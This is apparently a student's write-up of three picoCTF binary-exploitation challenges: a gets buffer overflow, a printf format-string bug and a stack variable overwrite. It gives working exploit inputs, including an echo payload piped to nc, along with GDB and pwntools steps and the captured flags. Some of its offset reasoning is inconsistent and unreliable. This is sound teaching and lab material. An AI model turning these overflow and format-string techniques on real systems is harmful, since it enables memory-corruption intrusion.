# 1.Buffer Overflow 0 

Let's start off simple, can you overflow the correct buffer? The program is available here. You can view source here.
Connect using:
nc saturn.picoctf.net 49802

## Solution:
ChatGPT said:

I started by launching the instance and downloading the files. The challenge name hinted at a buffer overflow, but I still reviewed the source. It immediately stood out that the program used gets, which is notorious for unchecked input and buffer overflows. A hint read "If you try to do the math by hand, maybe try and add a few more characters. Sometimes there are things you aren't expecting." That clarified the approach. I connected with
```
 nc saturn.picoctf.net 49802
 ```
and sent a large number of A characters. Once my input exceeded the gets buffer the overflow occurred and the flag was revealed.
## Flag:

```
 picoCTF{ov3rfl0ws_ar3nt_that_bad_c5ca6248}
```

## Concepts learnt:
I learned the meaning of a buffer overflow:
A buffer overflow happens when a program puts more data into a fixed-size space (a buffer) than that space can hold. The extra data spills over into nearby memory and can overwrite other information.


## Incorrect Tangents

At first I tried to learn how to find the overflow offset, but after reading the hint I just started sending a long string of A characters and that worked.

## Resources:

https://www.youtube.com/watch?v=AD-iXWANggo&pp=ygUPYnVmZmVyIG92ZXJmbG93


***

# 2.Format string 0

Can you use your knowledge of format strings to make the customers happy?
Download the binary here.
Download the source here.
Connect with the challenge instance here:
nc mimas.picoctf.net 60992

## Solution:
I started by launching the instance and downloading the files. After that I opened the provided source code. Simultaneously, I launched the instance and connected with:
```
nc mimas.picoctf.net 60992
```

The service printed a bunch of text and then asked for input, which told me where to look in the source. The content shown on my terminal was printed via a printf call inside the function:
```
void serve_patrick()
```

Input was read into a string choice1. There was also this line:
```
int count = printf(choice1);
```

so count held the number of characters printed from the input. That value was checked with an if condition:
```
if (count > 2 * BUFSIZE) {
    serve_bob();
}
```

BUFSIZE was defined as 32 at the top of the code, so count had to be greater than 64 to call serve_bob(). That would be our next step, but all the provided options were no more than 12–15 characters. One option, however, was different:

"Gr%114d_Cheese"


This contains %114d. When printf runs and encounters %114d, it expects to print a number with a width of 114 characters. Since no number is provided, it will print some garbage data, making the count large enough so the condition becomes true. That triggers:
```
void serve_bob()
```
Inside serve_bob() the program printed a hint:

"Sponge Bob wants something outrageous that would break the shop"

So I had to input another choice. In the bob function there was again a printf:
```
printf(choice2);
```
This time I entered:

Cla%sic_Che%s%steak

I entered that input because when this input is passed to printf, the %s specifiers expect string arguments, but none are provided (e.g. printf("%s", str)), so the program will probably crash and give the flag. Making the program crash was the goal which can be percieved from the “outrageous” order from Bob wanted.
## Flag:

```
picoCTF{7h3_cu570m3r_15_n3v3r_SEGFAULT_c8362f05}
```

## Concepts learnt:
I learnt about the format string vulnerability:
A format-string vulnerability happens when a program uses user input directly as the format string for functions like printf (e.g. printf(user_input)), so formatting tokens like %s, %x, %n in that input are interpreted by the function. That can make the program print or read/write unintended memory and cause crashes or data leaks.


## Incorrect Tangents

Before giving the proper inputs i spent a lot of time analyzing the code file itself and i tried to make chanegs in that only and that too locally which was really silly from my side as doing that would also not change anything after connecting but soon i realized that the challenge was all about exploiting printf vulnerabilities. 

## Resources:
https://youtu.be/0WvrSfcdq1I?si=EJuj-83klvlML1Fa

***

# 3.Clutter-overflow

Clutter, clutter everywhere and not a byte to use.
nc mars.picoctf.net 31890

## Solution:
I started by launching the instance and downloading the challenge files. First I checked the source and saw the line:
```
gets(clutter);
```

This made it clear the challenge is about a buffer overflow. I then launched the binary (after making it executable with chmod). I entered a few a characters and the program printed:
```
code == 0x0
code != 0xdeadbeef :(
```

So it was clear the variable code must be set to 0xdeadbeef to get the flag. To do that, I needed to overwrite a variable, so I analyzed the binary with GDB:
```
gdb chall
```

Then I disassembled main and set the disassembly flavor to Intel:
```
(gdb) set disassembly-flavor intel
(gdb) disassemble main
```

The disassembly showed:
```
   0x00000000004006c7 <+0>:     push   rbp
   0x00000000004006c8 <+1>:     mov    rbp,rsp
   0x00000000004006cb <+4>:     sub    rsp,0x110
   0x00000000004006d2 <+11>:    mov    QWORD PTR [rbp-0x8],0x0
   0x00000000004006da <+19>:    mov    rax,QWORD PTR [rip+0x20197f]        # 0x602060 <stdout@@GLIBC_2.2.5>
   0x00000000004006e1 <+26>:    mov    esi,0x0
   0x00000000004006e6 <+31>:    mov    rdi,rax
   0x00000000004006e9 <+34>:    call   0x4005a0 <setbuf@plt>
   0x00000000004006ee <+39>:    mov    rax,QWORD PTR [rip+0x20197b]        # 0x602070 <stdin@@GLIBC_2.2.5>
   0x00000000004006f5 <+46>:    mov    esi,0x0
   0x00000000004006fa <+51>:    mov    rdi,rax
   0x00000000004006fd <+54>:    call   0x4005a0 <setbuf@plt>
   0x0000000000400702 <+59>:    mov    rax,QWORD PTR [rip+0x201977]        # 0x602080 <stderr@@GLIBC_2.2.5>
   0x0000000000400709 <+66>:    mov    esi,0x0
   0x000000000040070e <+71>:    mov    rdi,rax
   0x0000000000400711 <+74>:    call   0x4005a0 <setbuf@plt>
   0x0000000000400716 <+79>:    mov    rax,QWORD PTR [rip+0x201933]        # 0x602050 <HEADER>
   0x000000000040071d <+86>:    mov    rdi,rax
   0x0000000000400720 <+89>:    call   0x400590 <puts@plt>
   0x0000000000400725 <+94>:    lea    rdi,[rip+0x69d]        # 0x400dc9
   0x000000000040072c <+101>:   call   0x400590 <puts@plt>
   0x0000000000400731 <+106>:   lea    rdi,[rip+0x6ac]        # 0x400de4
   0x0000000000400738 <+113>:   call   0x400590 <puts@plt>
   0x000000000040073d <+118>:   lea    rax,[rbp-0x110]
   0x0000000000400744 <+125>:   mov    rdi,rax
   0x0000000000400747 <+128>:   mov    eax,0x0
   0x000000000040074c <+133>:   call   0x4005d0 <gets@plt>
   0x0000000000400751 <+138>:   mov    eax,0xdeadbeef
   0x0000000000400756 <+143>:   cmp    QWORD PTR [rbp-0x8],rax
   0x000000000040075a <+147>:   jne    0x40078c <main+197>
   0x000000000040075c <+149>:   mov    esi,0xdeadbeef

```
From the cmp QWORD PTR [rbp-0x8], eax line I understood the code variable is stored at [rbp-0x8], so to get the flag I had to overwrite that saved stack slot. To find the offset I used pwntools to generate a cyclic pattern:
```
python3 -c "from pwn import cyclic; open('pat','wb').write(cyclic(600))"
```

This command creates a file named pat containing a 600-byte unique pattern. I passed this file to the binary in GDB and triggered a segmentation fault, then inspected the registers:
```
(gdb) run < pat
...
code == 0x6361617263616171
code != 0xdeadbeef :(

Program received signal SIGSEGV, Segmentation fault.
0x00000000004007c0 in main ()
(gdb) info registers
...
rbp            0x6361617463616173  0x6361617463616173
...
```

Now rbp held 0x6361617463616173. I searched for that value in the pattern:
```
python3 - <<'PY'
from pwn import cyclic_find
print(cyclic_find(0x6361617263616173))
PY
```


This returned 272. That told me the 8-byte sequence I searched for begins at byte index 272 in the input, meaning it occupies indices 272..279. Saved RBP is the 8 bytes immediately before the saved return address (saved RIP), so its start index is 272 - 8 = 264. (The -8 is simply because saved RBP is 8 bytes long and sits just before saved RIP.)

Therefore I crafted a payload that writes my 8-byte value at index 264. I used echo -e (because a simple echo won't interpret \x sequences) and tested locally first:
```
echo -e 'AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA\xef\xbe\xad\xde' | nc mars.picoctf.net 31890
```

This returned the flag.


## Flag:

```
picoCTF{c0ntr0ll3d_clutt3r_1n_my_buff3r}
```

## Concepts learnt:
I learned a few simple things from this challenge: the stack layout is input buffer → saved RBP (8 bytes) → return address, overflowing the buffer can overwrite those saved slots, the RBP value shown in GDB came from the saved RBP slot, pwntools cyclic()/cyclic_find() finds the exact byte offset in a test pattern, and GDB lets you disassemble and inspect registers to see which stack slot to change.


## Incorrect Tangents

The main incorrect tangent i went on was not using gdb to analyze the file and being solely dependent on the source code but soon i realized that this felt similar to one of the challenges told in the playlist(in resources) for buffer overflow.

## Resources:

https://www.youtube.com/watch?v=T03idxny9jE&list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN&index=13